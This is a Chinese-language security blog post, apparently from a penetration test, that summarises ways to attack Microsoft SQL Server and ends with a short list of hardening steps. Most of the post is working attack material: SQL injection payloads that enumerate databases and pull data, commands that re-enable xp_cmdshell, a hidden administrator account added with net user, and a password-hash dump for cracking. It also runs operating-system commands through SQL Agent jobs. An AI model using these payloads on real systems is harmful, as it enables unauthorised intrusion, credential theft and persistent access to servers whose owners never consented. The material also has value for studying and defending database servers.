> 原文链接: https://www.anquanke.com//post/id/156911 


# SQLServer攻击姿势与防护总结


                                阅读量   
                                **222814**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



## 0x01

之前也算是负责一个渗透项目，基本上都是MSSQL的服务器，这里写一下当时的渗透过程中用到的一些技巧之类的吧，各路大佬轻喷。



## 0x02

### <a class="reference-link" name="2.1%20%E7%AE%80%E4%BB%8B"></a>2.1 简介

从上次的项目里遇到的基本上都是ASP.NET + SQL Server 架构的服务器，因为MSSQL 只能运行在 **Windows** 平台上，如果攻击者获取了sa账号，就能够较为方便的获得高权限用户。

**MSSQL权限分类** (2008)

Dbcreator：这个服务器角色的成员可以创建、更改、删除和还原任何数据库。<br>
Diskadmin：这个服务器角色用于管理磁盘文件，比如镜像数据库和添加备份设备。Processadmin：SQL Server 2008能够多任务化，也就是说可以通过执行多个进程做多个事件。<br>
Securityadmin：这个服务器角色的成员将管理登录名及其属性。他们可以授权、拒绝和撤销服务器级权限。也可以授权、拒绝和撤销数据库级权限。另外，它们可以重置SQL Server 2008登录名的密码。<br>
Serveradmin：这个服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。Setupadmin：为需要管理链接服务器和控制启动的存储过程的用户而设计。这个角色的成员能添加到setupadmin，能增加、删除和配置链接服务器，并能控制启动过程。<br>
Sysadmin：这个服务器角色的成员有权在SQL Server 2008中执行任何任务。<br>
Public: 有两大特点，第一，初始状态时没有权限；第二，所有的数据库用户都是它的成员。<br>
固定数据库角色：<br>
（数据库用户权限）<br>
微软提供了9个内置的角色，以便于在数据库级别授予用户特殊的权限集合。<br>
db_owner: 该角色的用户可以在数据库中执行任何操作。<br>
db_accessadmin: 该角色的成员可以从数据库中增加或者删除用户。<br>
db_backupopperator: 该角色的成员允许备份数据库。<br>
db_datareader: 该角色的成员允许从任何表读取任何数据。<br>
db_datawriter: 该角色的成员允许往任何表写入数据。<br>
db_ddladmin：该角色的成员允许在数据库中增加、修改或者删除任何对象（即可以执行任何DDL语句）。<br>
db_denydatareader: 该角色的成员被拒绝查看数据库中的任何数据，但是他们仍然可以通过存储过程来查看。<br>
db_denydatawriter: 像db_denydatareader角色，该角色的成员被拒绝修改数据库中的任何数据，但是他们仍然可以通过存储过程来修改。<br>
db_securityadmin: 该角色的成员可以更改数据库中的权限和角色。<br>
public：在SQL Server 2008中每个数据库用户都属于public数据库角色。当尚未对某个用户授予或者拒绝对安全对象的特定权限时，这该用户将据称授予该安全对象的public角色的权限，这个数据库角色不能被删除。

### <a class="reference-link" name="2.2%20sa%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96"></a>2.2 sa口令获取

<a class="reference-link" name="2.2.1%20%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"></a>**2.2.1 源码泄露**

比如我之前遇到过的页面配置文件泄露，暴露了SQL Server服务器地址<br>[![](https://s1.ax1x.com/2018/08/18/Pf1LdI.png)](https://s1.ax1x.com/2018/08/18/Pf1LdI.png)

git文件泄露，www.zip等等

**<a name="2.2.2%20%E7%AB%AF%E5%8F%A3%E5%97%85%E6%8E%A2"></a>2.2.2 端口嗅探**

使用**Cain** 等工具进行1433端口嗅探，可能能够获取密码

<a name="2.2.3%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"></a>**2.2.3 暴力破解**

使用Hydra等工具直接对sa账户的密码进行爆破，所以说弱口令真的是很伤啊……

<a name="2.2.4%20%E6%B3%A8%E5%85%A5"></a>**2.2.4 注入**

<a class="reference-link" name="%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AFMSSQL"></a>判断是否是MSSQL

报错

```
asp?id=49 and user&gt;0
```

产生报错信息，还能拿到数据库的用户名，岂不美哉

系统表回显(IIS 报错关闭的情况)

```
asp?id=49 and (select count() from sysobjects)&gt;0
asp?id=49 and (select count() from msysobjects)&gt;0
```

如果第一条返回页面与原页面相同，第二条与原页面不同，几乎可以确定是MSSQL，否则便是Access

<a class="reference-link" name="%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"></a>常用语句

权限判断

```
and 1=(select is_srvrolemember(‘sysadmin’)) //判断是否是系统管理员
and 1=(select is_srvrolemember(‘db_owner’)) //判断是否是库权限
and 1=(select is_srvrolemember(‘public’)) //判断是否为public权限

;declare @d int //判断MsSQL支持多行语句查询

and user&gt;0 //获取当前数据库用户名

and db_name()&gt;0 //获取当前数据库名称

and 1=convert(int,db_name())或1=(select db_name()) //当前数据库名

and 1=(select @@servername) //本地服务名

and 1=(select HAS_DBACCESS(‘master’)) //判断是否有库读取权限
```

<a class="reference-link" name="%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"></a>注入过程
- 查库
```
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4) //（&gt;4 获取系统库 &lt;4 获取用户库）
and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name&lt;&gt; ‘1’) //查询下一个数据库
```
- 查表
```
?id=1 and 1=(select top 1 name from sysobjects where xtype=’U’ and name &lt;&gt; ‘threads’ and name &lt;&gt; ‘users’ )
```
- 列名
```
?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = ‘users’) and name &lt;&gt; ‘uname’ )
```
- 拿数据
```
?id=1 and 1=(select top 1 uname from users)
```

### <a class="reference-link" name="2.3%20xp_cmdshell"></a>2.3 xp_cmdshell

<a class="reference-link" name="2.3.1%20%E5%85%B3%E4%BA%8E"></a>**2.3.1 关于**

**xp_cmdshell:** 扩展存储过程将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。因为存在安全隐患，在SQLServer 2005后默认设置为关闭。

```
exec xp_cmdshell ‘whoami’
```

**存储过程**：存储过程(Stored Procedure),是一组为了完成特定功能的SQL 语句

可见[详解](https://www.w3cschool.cn/sql/sql-storage.html)

> <p>消息 15281，级别 16，状态 1，过程 xp_cmdshell，第 1 行<br>
SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>

产生错误信息，但是如果我们拥有sa账户，或者存在sa权限用户的注入点，就能够直接开启组件

<a class="reference-link" name="2.3.2%20%E6%81%A2%E5%A4%8D%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"></a>**2.3.2 恢复存储过程**

从SQL Server 2008开始，xp_cmdshell就是默认关闭状态，不过对于SA权限的用户来说，这些都是可恢复的。
- 删除或恢复 sp_addextendedproc
```
/ 删除 /
drop procedure sp_addextendproc
drop procedure sp_oacreate
exec sp_addextendedproc
/ 恢复 /
dbcc addextendedproc (“sp_oacreate”,”odsole70.dll”)
dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)
```
- 恢复 sp_oacreate 和 xp_cmdshell
```
exec sp_addextendedproc xp_cmdshell , @dllname = ‘xplog70.dll’
```

之后就是命令执行提权了

```
/* 没有任何安全措施的情况下 */

net user siweb$ siweb /add
net localgroup administrators siweb$ /add

直接就能连入3389了，再用mimikatz跑一下原管理员账号密码，成功拿下一台服务器
```

### <a class="reference-link" name="2.4%20%E6%8F%90%E6%9D%83"></a>2.4 提权

事实上，我自己感觉从08server开始，提权才是最麻烦的事情

<a class="reference-link" name="2.4.1%20%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7"></a>**2.4.1 普通账户**

从sql注入到网站中，如果只是普通账户（Public权限），当然数据是可以拿到，但是不能执行系统命令，可以通过备份数据库的方式进行写入webshell，再根据<br>
服务器中的其他东西，去试着提权。

还有一种方式，拿到加密后的SQL Server sa账户密码，使用johnny爆破

```
select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins
```

[http://www.openwall.com/john/j/john180j1w.zip](http://www.openwall.com/john/j/john180j1w.zip)<br>[http://openwall.info/wiki/_media/john/johnny/johnny_2.2_win.zip](http://openwall.info/wiki/_media/john/johnny/johnny_2.2_win.zip)<br>
成功后可以使用sa权限登入账户

<a class="reference-link" name="2.4.2%20Sa"></a>**2.4.2 Sa**

sa账户提权，基本上是走系统命令执行的路子，开启存储过程，执行命令，建议使用 SQLTOOLS

**不使用xp_cmdshell 提权**

```
use msdb;
exec sp_delete_job @job_name='abc82'
exec sp_add_job @job_name='abc82'
exec sp_add_jobstep @job_name='abc82',@step_name = 'Exec my sql',@subsystem='CMDEXEC',@command='cmd.exe /c whoami&gt;c:T3tmp.log'
exec sp_add_jobserver @job_name = 'abc82',@server_name = N'(local)'
exec sp_start_job @job_name='abc82'

if object_id('siweb3file') is not null drop table siweb3file
create table siweb3file (filev nvarchar(4000) null)
BULK INSERT siweb3file FROM 'c:T3tmp.log'

SET NO_BROWSETABLE ON

select * from siweb3file

SET NO_BROWSETABLE OFF

select * from siweb3file
if object_id('siweb3file') is not null drop table siweb3file
```

### <a class="reference-link" name="2.5%20%E9%98%B2%E6%8A%A4"></a>2.5 防护
1. 防火墙限制ip访问
1. 修改mssql端口
1. 单独数据库单独用户(PUBLIC角色)，给dbo权限
1. 禁用掉一些危险的存储过程
1. SA账户禁用或设置强密码
1. mssql使用NETWORK SERVICE账号
1. 配置数据库磁盘权限，数据库和网站目录外设定SA账户都不能写入文件


## 0x03

[不安全的TDS协议配置：一种高级的SQL Server中间人攻击方式](https://www.anquanke.com/post/id/91750)

[【译】攻击SQL Server的CLR库](https://xz.aliyun.com/t/60)

[PowerUpSQL – 攻击 SQL Server 的 PowerShell 工具包](https://github.com/NetSPI/PowerUpSQL)

[通过SQL Server与PowerUpSQL获取Windows自动登录密码](https://www.anquanke.com/post/id/85526)

[Hacking SQL Server Database Links: Lab Setup and Attack Guide](https://blog.netspi.com/wp-content/uploads/2017/05/Technical-Article-Hacking-SQL-Server-Database-Links-Setup-and-Attack-Guide.pdf)

[SQL Server Local Authorization Bypass](http://www.netspi.com/blog/2012/08/16/sql-server-2008-local-administrator-privilege-escalation/)
